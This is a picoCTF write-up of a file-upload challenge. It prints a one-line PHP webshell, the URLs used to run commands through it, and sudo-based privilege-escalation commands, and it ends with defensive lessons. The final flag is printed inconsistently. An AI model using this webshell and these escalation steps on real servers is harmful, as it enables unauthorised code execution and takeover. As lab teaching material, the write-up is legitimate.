## Overview

This picoCTF challenge presented a PHP-based web server with a file upload feature. I identified a lack of file validation, which allowed me to upload a malicious PHP webshell, gain Remote Code Execution (RCE), and eventually escalate privileges to capture the flag.

---

## Step 1: Initial Recon

The server allowed file uploads without strong validation. I suspected it lacked MIME type or file content checks.

I created a simple PHP webshell:

**shell.php**

```php
<?php system($_GET['cmd']); ?>
```

I uploaded the file successfully and accessed it at:

```
http://standard-pizzas.picotf.net:57142/uploads/shell.php
```

## Step 2: Gaining Remote Code Execution

To verify code execution, I ran:

```
http://standard-pizzas.picotf.net:57142/uploads/shell.php?cmd=ls+-al
```

The output showed that commands were executed on the server under the `/uploads` directory as the `www-data` user.

## Step 3: Privilege Escalation

### 1. Search for SUID Binaries

I ran this to check which binaries run as their owner (usually root) regardless of who executes them:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Key result:

```
/usr/bin/sudo
```

### 2. Check Sudo Permissions

```bash
sudo -l
```

Output:

```
(ALL) NOPASSWD: ALL
```

This meant I could run **any command as root** with `sudo` and **no password required**.

### 3. Read the Flag

```bash
sudo cat /root/flag.txt
```

Flag obtained ðŸŽ¯

```
picoCTF{example_flag_here}
```

## Conclusion

This challenge was a great example of a classic **file upload vulnerability** that led to full **server takeover**. Once RCE was achieved via a PHP shell, enumeration and misconfigured sudo permissions allowed for **easy privilege escalation**.



Lessons:

- Always validate uploaded file types and contents.
- Disable execution permissions in upload directories.
- Restrict `sudo` access tightly.

**Flag:** `picoCTF{picoCTF{example_flag_here}}`
